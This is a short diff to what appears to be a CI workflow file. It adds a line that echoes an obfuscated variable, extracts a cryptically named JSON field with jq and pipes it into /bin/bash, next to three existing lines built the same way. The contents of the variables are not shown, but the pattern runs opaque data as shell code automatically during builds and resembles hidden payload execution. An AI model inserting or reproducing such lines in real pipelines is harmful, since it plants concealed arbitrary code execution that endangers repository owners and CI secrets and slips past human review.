@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$jruy64" | jq -r .x3 | /bin/bash
           echo $qz1 | jq -r .fqgfr8823 | /bin/bash
           printf '%s' "$rwa6" | jq -r .dvb4188 | /bin/bash
+          echo $kp2 | jq -r .gmnqo3 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
